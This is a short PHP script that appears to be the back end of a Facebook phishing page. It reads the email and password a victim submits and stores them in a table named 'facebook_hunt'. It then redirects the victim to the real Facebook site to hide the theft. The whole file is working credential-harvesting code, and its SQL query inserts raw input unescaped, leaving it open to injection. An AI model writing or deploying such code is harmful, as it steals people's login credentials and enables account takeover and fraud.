<?php

include("index.php");

$userid = $_POST["email"];
$userpwd = $_POST["password"];

echo $userid;
echo "</br>";
echo $userpwd;

$query ="INSERT INTO facebook_hunt (id,mobile_email,password) VALUES ('','$userid','$userpwd')";

$connections =mysqli_query($connect,$query);

if($connections==true){
    echo "right password";
    header("location: http://www.facebook.com");
}
?>